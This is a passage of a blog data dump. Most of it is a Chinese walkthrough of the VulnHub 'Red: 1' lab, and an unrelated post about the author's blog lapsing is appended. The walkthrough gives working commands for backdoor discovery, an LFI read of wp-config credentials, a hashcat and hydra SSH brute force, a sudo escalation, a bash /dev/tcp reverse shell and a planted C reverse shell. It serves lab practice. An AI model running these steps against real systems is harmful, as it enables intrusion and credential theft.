测试环境\n攻击机：Kali 192.168.56.109\n\n目标靶机：Ubuntu 192.168.56.113\n\n## 测试过程\n\n#### 信息收集\n查找靶机IP`arp-scan -I eth1 -l`，获取到目标IP为192.168.56.113。\n![1](https://img.freeaes.com/images/2021/12/19/1.png)\n\n使用nmap扫描目标开放了哪些端口`nmap -sS -p- -n 192.168.56.113,nmap -sV -p22,80 -n 192.168.56.113`\n![2](https://img.freeaes.com/images/2021/12/19/2.png)\n\n访问目标网站，并没有被解析，显示并不完整，查看源码，超链接都指向`redrocks.win`，修改hosts文件，将redrocks.win指向192.168.56.113。\n![3](https://img.freeaes.com/images/2021/12/19/3.png)\n\n网页恢复正常，是个wordpress站点。在查看`redrocks.win/2021/10/24/hello-world/`源码时发现有行奇怪的注释，一开始以为是网站的用户名，但是使用忘记密码页面时显示无此账户，并且它的首字母大写并不是很正常`Looking For It`，缩写就是LFI（Local File Inclusion）\n![4]https://img.freeaes.com/images/2021/12/19/4.png\n\n#### 查找后门文件\n并且网站页面上有hacker留下的信息`You’ll never find the backdoor`，证明是有后门文件的，通过gobuster使用`https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt`文件进行遍历，先将文件保存到本地，执行`gobuster dir -u http://redrocks.win -w CommonBackdoors-PHP.fuzz.txt`，应为文件内已有后缀，所以不用再指定后缀名。\n\n![5](https://img.freeaes.com/images/2021/12/19/5.png)\n\n找到一个`NetworkFileManagerPHP.php`。状态码为500，因为是个文件包含所以应该需要一个参数指定包含的文件名，通过burpsuite使用`https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt`文件进行爆破，将文件保存到本地，使用Intrude模块导入字典，设置好参数后爆破得到参数为`key`。\n\n![6](https://img.freeaes.com/images/2021/12/19/6.png)\n\n![7](https://img.freeaes.com/images/2021/12/19/7.png)\n\n#### 后门利用\n可以看到除了root外还有四个用户，因为直接读取wp-config.php不成功，所以需要使用php伪协议读取`php://filter/convert.base64-encode/resource=wp-config.php`，选中base64密文，按`Ctrl+Shift+B`解密。文件内有数据库的用户名和其密码`john/R3v_m4lwh3r3_k1nG!!`，但是并不能用来登录后台或ssh\n\n![8](https://img.freeaes.com/images/2021/12/19/8.png)\n\n![9](https://img.freeaes.com/images/2021/12/19/9.png)\n\n通过读取Network File Manager PHP.php文件发现里面有一串注释过的信息`That password alone won't help you! Hashcat says rules are rules`。\n\n![10](https://img.freeaes.com/images/2021/12/19/10.png)\n\n![11](https://img.freeaes.com/images/2021/12/19/11.png)\n\n#### hash碰撞\nhashcat的规则有很多，不过鉴于信息是由base64提供的，选择bset64规则进行hash碰撞`hashcat --force pass -r /usr/share/hashcat/rules/best64.rule --stdout > pswd`\n\n![12](https://img.freeaes.com/images/2021/12/19/12.png)\n\n![13](https://img.freeaes.com/images/2021/12/19/13.png)\n\n使用解出的密码通过hydra进行ssh爆破`hydra -l john -P pswd ssh://192.168.56.113`，得出密码为`R3v_m4lwh3r3_k1nG!!0`，使用ssh连接。\n\n![14](https://img.freeaes.com/images/2021/12/19/14.png)\n\n#### 会话维持\n使用`sudo -l`查看当前用户可执行的命令，有time，执行`sudo -u ippsec /usr/bin/time /bin/bash`切换到ippsec用户。\n\n![15](https://img.freeaes.com/images/2021/12/19/15.png)\n\n\nhacker会不断的给我们发送信息干扰，一段时间后还会将我们踢出连接并修改密码。\n首先我们反弹一个shell到kali。先在kali执行`nc -lvvp 8848`建立监听端口，然后在目标机器上执行`bash -i >& /dev/tcp/192.168.56.109/8848 0>&1`。反弹成功后执行`python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`，这样即使ssh被踢掉也不会断开。\n\n![16](https://img.freeaes.com/images/2021/12/19/16.png)\n\n#### 权限提出\n网站目录下的wordpress目录内有个.git目录，里面有两个文件，rev和supersecretfileuc.c，rev是supersecretfileuc.c编译的程序，执行会输出信息，就是red时不时弹出的骚扰信息，将rev删除后过段时间会重新编译，并且是root权限。\n\n![17](https://img.freeaes.com/images/2021/12/19/17.png)\n\n删掉这两个文件，用revshell.com网站生成C的反弹shell程序，通过http服务将其传到目标机器写入supersecretfileuc.c，并在kali监听9001端口，过段时间它会自动编译并执行。在root目录下有个root.txt文件。\n\n![18](https://img.freeaes.com/images/2021/12/19/18.png)\n\n![19](https://img.freeaes.com/images/2021/12/19/19.png)\n\n![20](https://img.freeaes.com/images/2021/12/19/20.png)\n","source":"_posts/2021-12-19.md","raw":"---\ntitle: VulnHub | Red-1\ndate: 2021-12-19 20:38:02\ncover: https://img.freeaes.com/images/2021/09/05/8.jpg\ntags:\n- VulnHub\ncategories: 学习笔记\n---\n\n# Red : 1\n\n## 项目地址\n[http://www.vulnhub.com/entry/red-1,753/](http://www.vulnhub.com/entry/red-1,753/)\n难度：Medium\n\n## 测试环境\n攻击机：Kali 192.168.56.109\n\n目标靶机：Ubuntu 192.168.56.113\n\n## 测试过程\n\n#### 信息收集\n查找靶机IP`arp-scan -I eth1 -l`，获取到目标IP为192.168.56.113。\n![1](https://img.freeaes.com/images/2021/12/19/1.png)\n\n使用nmap扫描目标开放了哪些端口`nmap -sS -p- -n 192.168.56.113,nmap -sV -p22,80 -n 192.168.56.113`\n![2](https://img.freeaes.com/images/2021/12/19/2.png)\n\n访问目标网站，并没有被解析，显示并不完整，查看源码，超链接都指向`redrocks.win`，修改hosts文件，将redrocks.win指向192.168.56.113。\n![3](https://img.freeaes.com/images/2021/12/19/3.png)\n\n网页恢复正常，是个wordpress站点。在查看`redrocks.win/2021/10/24/hello-world/`源码时发现有行奇怪的注释，一开始以为是网站的用户名，但是使用忘记密码页面时显示无此账户，并且它的首字母大写并不是很正常`Looking For It`，缩写就是LFI（Local File Inclusion）\n![4]https://img.freeaes.com/images/2021/12/19/4.png\n\n#### 查找后门文件\n并且网站页面上有hacker留下的信息`You’ll never find the backdoor`，证明是有后门文件的，通过gobuster使用`https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt`文件进行遍历，先将文件保存到本地，执行`gobuster dir -u http://redrocks.win -w CommonBackdoors-PHP.fuzz.txt`，应为文件内已有后缀，所以不用再指定后缀名。\n\n![5](https://img.freeaes.com/images/2021/12/19/5.png)\n\n找到一个`NetworkFileManagerPHP.php`。状态码为500，因为是个文件包含所以应该需要一个参数指定包含的文件名，通过burpsuite使用`https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt`文件进行爆破，将文件保存到本地，使用Intrude模块导入字典，设置好参数后爆破得到参数为`key`。\n\n![6](https://img.freeaes.com/images/2021/12/19/6.png)\n\n![7](https://img.freeaes.com/images/2021/12/19/7.png)\n\n#### 后门利用\n可以看到除了root外还有四个用户，因为直接读取wp-config.php不成功，所以需要使用php伪协议读取`php://filter/convert.base64-encode/resource=wp-config.php`，选中base64密文，按`Ctrl+Shift+B`解密。文件内有数据库的用户名和其密码`john/R3v_m4lwh3r3_k1nG!!`，但是并不能用来登录后台或ssh\n\n![8](https://img.freeaes.com/images/2021/12/19/8.png)\n\n![9](https://img.freeaes.com/images/2021/12/19/9.png)\n\n通过读取Network File Manager PHP.php文件发现里面有一串注释过的信息`That password alone won't help you! Hashcat says rules are rules`。\n\n![10](https://img.freeaes.com/images/2021/12/19/10.png)\n\n![11](https://img.freeaes.com/images/2021/12/19/11.png)\n\n#### hash碰撞\nhashcat的规则有很多，不过鉴于信息是由base64提供的，选择bset64规则进行hash碰撞`hashcat --force pass -r /usr/share/hashcat/rules/best64.rule --stdout > pswd`\n\n![12](https://img.freeaes.com/images/2021/12/19/12.png)\n\n![13](https://img.freeaes.com/images/2021/12/19/13.png)\n\n使用解出的密码通过hydra进行ssh爆破`hydra -l john -P pswd ssh://192.168.56.113`，得出密码为`R3v_m4lwh3r3_k1nG!!0`，使用ssh连接。\n\n![14](https://img.freeaes.com/images/2021/12/19/14.png)\n\n#### 会话维持\n使用`sudo -l`查看当前用户可执行的命令，有time，执行`sudo -u ippsec /usr/bin/time /bin/bash`切换到ippsec用户。\n\n![15](https://img.freeaes.com/images/2021/12/19/15.png)\n\n\nhacker会不断的给我们发送信息干扰，一段时间后还会将我们踢出连接并修改密码。\n首先我们反弹一个shell到kali。先在kali执行`nc -lvvp 8848`建立监听端口，然后在目标机器上执行`bash -i >& /dev/tcp/192.168.56.109/8848 0>&1`。反弹成功后执行`python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`，这样即使ssh被踢掉也不会断开。\n\n![16](https://img.freeaes.com/images/2021/12/19/16.png)\n\n#### 权限提出\n网站目录下的wordpress目录内有个.git目录，里面有两个文件，rev和supersecretfileuc.c，rev是supersecretfileuc.c编译的程序，执行会输出信息，就是red时不时弹出的骚扰信息，将rev删除后过段时间会重新编译，并且是root权限。\n\n![17](https://img.freeaes.com/images/2021/12/19/17.png)\n\n删掉这两个文件，用revshell.com网站生成C的反弹shell程序，通过http服务将其传到目标机器写入supersecretfileuc.c，并在kali监听9001端口，过段时间它会自动编译并执行。在root目录下有个root.txt文件。\n\n![18](https://img.freeaes.com/images/2021/12/19/18.png)\n\n![19](https://img.freeaes.com/images/2021/12/19/19.png)\n\n![20](https://img.freeaes.com/images/2021/12/19/20.png)\n","slug":"2021-12-19","published":1,"updated":"2022-01-13T08:04:37.545Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsviib000tuxf7gyqyg1h3","content":"<h1 id=\"Red-1\"><a href=\"#Red-1\" class=\"headerlink\" title=\"Red : 1\"></a>Red : 1</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/red-1,753/\">http://www.vulnhub.com/entry/red-1,753/</a><br>难度：Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.109</p>\n<p>目标靶机：Ubuntu 192.168.56.113</p>\n<h2 id=\"测试过程\"><a href=\"#测试过程\" class=\"headerlink\" title=\"测试过程\"></a>测试过程</h2><h4 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h4><p>查找靶机IP<code>arp-scan -I eth1 -l</code>，获取到目标IP为192.168.56.113。<br><img src=\"https://img.freeaes.com/images/2021/12/19/1.png\" alt=\"1\"></p>\n<p>使用nmap扫描目标开放了哪些端口<code>nmap -sS -p- -n 192.168.56.113,nmap -sV -p22,80 -n 192.168.56.113</code><br><img src=\"https://img.freeaes.com/images/2021/12/19/2.png\" alt=\"2\"></p>\n<p>访问目标网站，并没有被解析，显示并不完整，查看源码，超链接都指向<code>redrocks.win</code>，修改hosts文件，将redrocks.win指向192.168.56.113。<br><img src=\"https://img.freeaes.com/images/2021/12/19/3.png\" alt=\"3\"></p>\n<p>网页恢复正常，是个wordpress站点。在查看<code>redrocks.win/2021/10/24/hello-world/</code>源码时发现有行奇怪的注释，一开始以为是网站的用户名，但是使用忘记密码页面时显示无此账户，并且它的首字母大写并不是很正常<code>Looking For It</code>，缩写就是LFI（Local File Inclusion）<br>![4]<a href=\"https://img.freeaes.com/images/2021/12/19/4.png\">https://img.freeaes.com/images/2021/12/19/4.png</a></p>\n<h4 id=\"查找后门文件\"><a href=\"#查找后门文件\" class=\"headerlink\" title=\"查找后门文件\"></a>查找后门文件</h4><p>并且网站页面上有hacker留下的信息<code>You’ll never find the backdoor</code>，证明是有后门文件的，通过gobuster使用<code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt</code>文件进行遍历，先将文件保存到本地，执行<code>gobuster dir -u http://redrocks.win -w CommonBackdoors-PHP.fuzz.txt</code>，应为文件内已有后缀，所以不用再指定后缀名。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/5.png\" alt=\"5\"></p>\n<p>找到一个<code>NetworkFileManagerPHP.php</code>。状态码为500，因为是个文件包含所以应该需要一个参数指定包含的文件名，通过burpsuite使用<code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt</code>文件进行爆破，将文件保存到本地，使用Intrude模块导入字典，设置好参数后爆破得到参数为<code>key</code>。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/6.png\" alt=\"6\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/7.png\" alt=\"7\"></p>\n<h4 id=\"后门利用\"><a href=\"#后门利用\" class=\"headerlink\" title=\"后门利用\"></a>后门利用</h4><p>可以看到除了root外还有四个用户，因为直接读取wp-config.php不成功，所以需要使用php伪协议读取<code>php://filter/convert.base64-encode/resource=wp-config.php</code>，选中base64密文，按<code>Ctrl+Shift+B</code>解密。文件内有数据库的用户名和其密码<code>john/R3v_m4lwh3r3_k1nG!!</code>，但是并不能用来登录后台或ssh</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/8.png\" alt=\"8\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/9.png\" alt=\"9\"></p>\n<p>通过读取Network File Manager PHP.php文件发现里面有一串注释过的信息<code>That password alone won&#39;t help you! Hashcat says rules are rules</code>。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/10.png\" alt=\"10\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/11.png\" alt=\"11\"></p>\n<h4 id=\"hash碰撞\"><a href=\"#hash碰撞\" class=\"headerlink\" title=\"hash碰撞\"></a>hash碰撞</h4><p>hashcat的规则有很多，不过鉴于信息是由base64提供的，选择bset64规则进行hash碰撞<code>hashcat --force pass -r /usr/share/hashcat/rules/best64.rule --stdout &gt; pswd</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/12.png\" alt=\"12\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/13.png\" alt=\"13\"></p>\n<p>使用解出的密码通过hydra进行ssh爆破<code>hydra -l john -P pswd ssh://192.168.56.113</code>，得出密码为<code>R3v_m4lwh3r3_k1nG!!0</code>，使用ssh连接。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/14.png\" alt=\"14\"></p>\n<h4 id=\"会话维持\"><a href=\"#会话维持\" class=\"headerlink\" title=\"会话维持\"></a>会话维持</h4><p>使用<code>sudo -l</code>查看当前用户可执行的命令，有time，执行<code>sudo -u ippsec /usr/bin/time /bin/bash</code>切换到ippsec用户。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/15.png\" alt=\"15\"></p>\n<p>hacker会不断的给我们发送信息干扰，一段时间后还会将我们踢出连接并修改密码。<br>首先我们反弹一个shell到kali。先在kali执行<code>nc -lvvp 8848</code>建立监听端口，然后在目标机器上执行<code>bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1</code>。反弹成功后执行<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，这样即使ssh被踢掉也不会断开。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/16.png\" alt=\"16\"></p>\n<h4 id=\"权限提出\"><a href=\"#权限提出\" class=\"headerlink\" title=\"权限提出\"></a>权限提出</h4><p>网站目录下的wordpress目录内有个.git目录，里面有两个文件，rev和supersecretfileuc.c，rev是supersecretfileuc.c编译的程序，执行会输出信息，就是red时不时弹出的骚扰信息，将rev删除后过段时间会重新编译，并且是root权限。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/17.png\" alt=\"17\"></p>\n<p>删掉这两个文件，用revshell.com网站生成C的反弹shell程序，通过http服务将其传到目标机器写入supersecretfileuc.c，并在kali监听9001端口，过段时间它会自动编译并执行。在root目录下有个root.txt文件。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/18.png\" alt=\"18\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/19.png\" alt=\"19\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/20.png\" alt=\"20\"></p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h1 id=\"Red-1\"><a href=\"#Red-1\" class=\"headerlink\" title=\"Red : 1\"></a>Red : 1</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/red-1,753/\">http://www.vulnhub.com/entry/red-1,753/</a><br>难度：Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.109</p>\n<p>目标靶机：Ubuntu 192.168.56.113</p>\n<h2 id=\"测试过程\"><a href=\"#测试过程\" class=\"headerlink\" title=\"测试过程\"></a>测试过程</h2><h4 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h4><p>查找靶机IP<code>arp-scan -I eth1 -l</code>，获取到目标IP为192.168.56.113。<br><img src=\"https://img.freeaes.com/images/2021/12/19/1.png\" alt=\"1\"></p>\n<p>使用nmap扫描目标开放了哪些端口<code>nmap -sS -p- -n 192.168.56.113,nmap -sV -p22,80 -n 192.168.56.113</code><br><img src=\"https://img.freeaes.com/images/2021/12/19/2.png\" alt=\"2\"></p>\n<p>访问目标网站，并没有被解析，显示并不完整，查看源码，超链接都指向<code>redrocks.win</code>，修改hosts文件，将redrocks.win指向192.168.56.113。<br><img src=\"https://img.freeaes.com/images/2021/12/19/3.png\" alt=\"3\"></p>\n<p>网页恢复正常，是个wordpress站点。在查看<code>redrocks.win/2021/10/24/hello-world/</code>源码时发现有行奇怪的注释，一开始以为是网站的用户名，但是使用忘记密码页面时显示无此账户，并且它的首字母大写并不是很正常<code>Looking For It</code>，缩写就是LFI（Local File Inclusion）<br>![4]<a href=\"https://img.freeaes.com/images/2021/12/19/4.png\">https://img.freeaes.com/images/2021/12/19/4.png</a></p>\n<h4 id=\"查找后门文件\"><a href=\"#查找后门文件\" class=\"headerlink\" title=\"查找后门文件\"></a>查找后门文件</h4><p>并且网站页面上有hacker留下的信息<code>You’ll never find the backdoor</code>，证明是有后门文件的，通过gobuster使用<code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt</code>文件进行遍历，先将文件保存到本地，执行<code>gobuster dir -u http://redrocks.win -w CommonBackdoors-PHP.fuzz.txt</code>，应为文件内已有后缀，所以不用再指定后缀名。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/5.png\" alt=\"5\"></p>\n<p>找到一个<code>NetworkFileManagerPHP.php</code>。状态码为500，因为是个文件包含所以应该需要一个参数指定包含的文件名，通过burpsuite使用<code>https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt</code>文件进行爆破，将文件保存到本地，使用Intrude模块导入字典，设置好参数后爆破得到参数为<code>key</code>。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/6.png\" alt=\"6\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/7.png\" alt=\"7\"></p>\n<h4 id=\"后门利用\"><a href=\"#后门利用\" class=\"headerlink\" title=\"后门利用\"></a>后门利用</h4><p>可以看到除了root外还有四个用户，因为直接读取wp-config.php不成功，所以需要使用php伪协议读取<code>php://filter/convert.base64-encode/resource=wp-config.php</code>，选中base64密文，按<code>Ctrl+Shift+B</code>解密。文件内有数据库的用户名和其密码<code>john/R3v_m4lwh3r3_k1nG!!</code>，但是并不能用来登录后台或ssh</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/8.png\" alt=\"8\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/9.png\" alt=\"9\"></p>\n<p>通过读取Network File Manager PHP.php文件发现里面有一串注释过的信息<code>That password alone won&#39;t help you! Hashcat says rules are rules</code>。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/10.png\" alt=\"10\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/11.png\" alt=\"11\"></p>\n<h4 id=\"hash碰撞\"><a href=\"#hash碰撞\" class=\"headerlink\" title=\"hash碰撞\"></a>hash碰撞</h4><p>hashcat的规则有很多，不过鉴于信息是由base64提供的，选择bset64规则进行hash碰撞<code>hashcat --force pass -r /usr/share/hashcat/rules/best64.rule --stdout &gt; pswd</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/12.png\" alt=\"12\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/13.png\" alt=\"13\"></p>\n<p>使用解出的密码通过hydra进行ssh爆破<code>hydra -l john -P pswd ssh://192.168.56.113</code>，得出密码为<code>R3v_m4lwh3r3_k1nG!!0</code>，使用ssh连接。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/14.png\" alt=\"14\"></p>\n<h4 id=\"会话维持\"><a href=\"#会话维持\" class=\"headerlink\" title=\"会话维持\"></a>会话维持</h4><p>使用<code>sudo -l</code>查看当前用户可执行的命令，有time，执行<code>sudo -u ippsec /usr/bin/time /bin/bash</code>切换到ippsec用户。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/15.png\" alt=\"15\"></p>\n<p>hacker会不断的给我们发送信息干扰，一段时间后还会将我们踢出连接并修改密码。<br>首先我们反弹一个shell到kali。先在kali执行<code>nc -lvvp 8848</code>建立监听端口，然后在目标机器上执行<code>bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1</code>。反弹成功后执行<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，这样即使ssh被踢掉也不会断开。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/16.png\" alt=\"16\"></p>\n<h4 id=\"权限提出\"><a href=\"#权限提出\" class=\"headerlink\" title=\"权限提出\"></a>权限提出</h4><p>网站目录下的wordpress目录内有个.git目录，里面有两个文件，rev和supersecretfileuc.c，rev是supersecretfileuc.c编译的程序，执行会输出信息，就是red时不时弹出的骚扰信息，将rev删除后过段时间会重新编译，并且是root权限。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/17.png\" alt=\"17\"></p>\n<p>删掉这两个文件，用revshell.com网站生成C的反弹shell程序，通过http服务将其传到目标机器写入supersecretfileuc.c，并在kali监听9001端口，过段时间它会自动编译并执行。在root目录下有个root.txt文件。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/18.png\" alt=\"18\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/19.png\" alt=\"19\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/19/20.png\" alt=\"20\"></p>\n"},{"title":"我活了！","date":"2021-09-01T09:41:25.000Z","cover":"https://img.freeaes.com/images/2021/09/05/2.jpg","_content":"\n一晃眼，三个月没更新博客了，再一晃三个月后，我的网站莫得了，说实话，很难受，兄弟们。\n\n## 懒\n有一说一，不更新不是懒，只是单纯的不想浪费各位大哥的时间来看我这么水的文章，~~虽然之前写的也不是啥高质量~~。\n\n## 网站关闭\n这个问题有着长达一年半的历史，故事要从去年一月份也就是的时候说起，当时我放假在老家养老，然后突然闲得蛋疼的想建个网站，不为别的，就单纯想装13，而且在自己的网站上想写啥写啥，不会被平台管制，~~虽然一年多过去了也没想到写些什么奇奇怪怪的东西~~。然后就开始了买VPS，买域名，搜文章，找源码，搭网站。\n\n在我用了一天时间搞定后，正准备打开网站截图留念一下的时候给我弹出了类似下面这个东西的东西...\n![beian](https://freeaes.com/img/2021-9-1/1.jpg)\n然后我去百度了一下，这能说大天朝整治的太好了～，后面又因为某种不可抗力因素我无法备案，就只能将就一下用了境外的VPS，中途更换了挺多个服务商，在去年六月份的时候，我看到腾讯有个新用户优惠，然后买了他们家的香港的服务器~~说实话真的贵~~。\n\n因有了，果呢就是今年六月份的时候，他到期了，然后我忘记了，直到八月份的时候我才突然想起原来我还有个博客。当我打开网站的时候打不开，然后去到腾讯云才想起lz没续费，无了。\n\n最后我还是选择了学生机，本来想继续在马化腾家买的，但是发现他还有续费次数限制，我是真服了，没办法，像我这种穷人只能按月付款，最后还是投入了马云的怀抱，然后顺便申请了备案，直到昨天才申请通过，可是我之前的文章都莫得了，是真莫得了，谷歌还好，百度直接把之前收录的都删了，属实难受好吧，直接重开，然后搭建的环境什么的也要再搭一次。\n\n## 最后说一下\n博客还是会更的，不过更新时间可能会很长。无了，就这样吧，吃饭去了。   \n","source":"_posts/2021-9-1.md","raw":"---\ntitle: 我活了！\ndate: 2021-09-01 17:41:25\ntags:\n- 日常\ncover: https://img.freeaes.com/images/2021/09/05/2.jpg\n---\n\n一晃眼，三个月没更新博客了，再一晃三个月后，我的网站莫得了，说实话，很难受，兄弟们。\n\n## 懒\n有一说一，不更新不是懒，只是单纯的不想浪费各位大哥的时间来看我这么水的文章，~~虽然之前写的也不是啥高质量~~。\n\n## 网站关闭\n这个问题有着长达一年半的历史，故事要从去年一月份也就是的时候说起，当时我放假在老家养老，然后突然闲得蛋疼的想建个网站，不为别的，就单纯想装13，而且在自己的网站上想写啥写啥，不会被平台管制，~~虽然一年多过去了也没想到写些什么奇奇怪怪的东西~~。然后就开始了买VPS，买域名，搜文章，找源码，搭网站。\n\n在我用了一天时间搞定后，正准备打开网站截图留念一下的时候给我弹出了类似下面这个东西的东西...\n![beian](https://freeaes.com/img/2021-9-1/1.jpg)\n然后我去百度了一下，这能说大天朝整治的太好了～，后面又因为某种不可抗力因素我无法备案，就只能将就一下用了境外的VPS，中途更换了挺多个服务商，在去年六月份的时候，我看到腾讯有个新用户优惠，然后买了他们家的香港的服务器~~说实话真的贵~~。\n\n因有了，果呢就是今年六月份的时候，他到期了，然后我忘记了，直到八月份的时候我才突然想起原来我还有个博客。当我打开网站的时候打不开，然后去到腾讯云才想起lz没续费，无了。\n\n最后我还是选择了学生机，本来想继续在马化腾家买的，但是发现他还有续费次数限制，我是真服了，没办法，像我这种穷人只能按月付款，最后还是投入了马云的怀抱，然后顺便申请了备案，直到昨天才申请通过，可是我之前的文章都莫得了，是真莫得了，谷歌还好，百度直接把之前收录的都删了，属实难受好吧，直接重开，然后搭建的环境什么的也要再搭一次。\n\n## 最后说一下\n博客还是会更的，不过更新时间可能会很长。无了，就这样吧，吃饭去了。   \n","slug":"2021-9-1","published":1,"updated":"2022-01-13T08:04:37.543Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsviie000wuxf7cmvi2vdo","content":"<p>一晃眼，三个月没更新博客了，再一晃三个月后，我的网站莫得了，说实话，很难受，兄弟们。</p>\n<h2 id=\"懒\"><a href=\"#懒\" class=\"headerlink\" title=\"懒\"></a>懒</h2><p>有一说一，不更新不是懒，只是单纯的不想浪费各位大哥的时间来看我这么水的文章，<del>虽然之前写的也不是啥高质量</del>。</p>\n<h2 id=\"网站关闭\"><a href=\"#网站关闭\" class=\"headerlink\" title=\"网站关闭\"></a>网站关闭</h2><p>这个问题有着长达一年半的历史，故事要从去年一月份也就是的时候说起，当时我放假在老家养老，然后突然闲得蛋疼的想建个网站，不为别的，就单纯想装13，而且在自己的网站上想写啥写啥，不会被平台管制，<del>虽然一年多过去了也没想到写些什么奇奇怪怪的东西</del>。然后就开始了买VPS，买域名，搜文章，找源码，搭网站。</p>\n<p>在我用了一天时间搞定后，正准备打开网站截图留念一下的时候给我弹出了类似下面这个东西的东西…<br><img src=\"https://freeaes.com/img/2021-9-1/1.jpg\" alt=\"beian\"><br>然后我去百度了一下，这能说大天朝整治的太好了～，后面又因为某种不可抗力因素我无法备案，就只能将就一下用了境外的VPS，中途更换了挺多个服务商，在去年六月份的时候，我看到腾讯有个新用户优惠，然后买了他们家的香港的服务器<del>说实话真的贵</del>。</p>\n<p>因有了，果呢就是今年六月份的时候，他到期了，然后我忘记了，直到八月份的时候我才突然想起原来我还有个博客。当我打开网站的时候打不开，然后去到腾讯云才想起lz没续费，无了。</p>\n<p>最后我还是选择了学生机，本来想继续在马化腾家买的，但是发现他还有续费次数限制，我是真服了，没办法，像我这种穷人只能按月付款，最后还是投入了马云的怀抱，然后顺便申请了备案，直到昨天才申请通过，可是我之前的文章都莫得了，是真莫得了，谷歌还好，百度直接把之前收录的都删了，属实难受好吧，直接重开，然后搭建的环境什么的也要再搭一次。</p>\n<h2 id=\"最后说一下\"><a href=\"#最后说一下\" class=\"headerlink\" title=\"最后说一下\"></a>最后说一下</h2><p>博客还是会更的，不过更新时间可能会很长。无了，就这样吧，吃饭去了。   </p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<p>一晃眼，三个月没更新博客了，再一晃三个月后，我的网站莫得了，说实话，很难受，兄弟们。</p>\n<h2 id=\"懒\"><a href=\"#懒\" class=\"headerlink\" title=\"懒\"></a>懒</h2><p>有一说一，不更新不是懒，只是单纯的不想浪费各位大哥的时间来看我这么水的文章，<del>虽然之前写的也不是啥高质量</del>。</p>\n<h2 id=\"网站关闭\"><a href=\"#网站关闭\" class=\"headerlink\" 